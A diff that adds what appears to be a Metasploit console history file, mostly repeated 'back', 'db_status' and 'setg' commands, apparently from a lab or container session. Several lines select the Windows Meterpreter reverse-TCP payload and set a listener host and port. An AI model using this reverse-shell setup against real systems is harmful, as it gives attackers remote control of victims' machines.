@@ -1,0 +1,22 @@
+back
+db_status
+back
+setg
+use windows/meterpreter/reverse_tcp
+back
+setg LHOST 172.17.0.3
+back
+back
+jobs
+setg LPORT 5574
+back
+back
+?
+back
+db_status
+back
+setg
+back
+use windows/meterpreter/reverse_tcp
+setg LHOST 172.17.0.3
+back
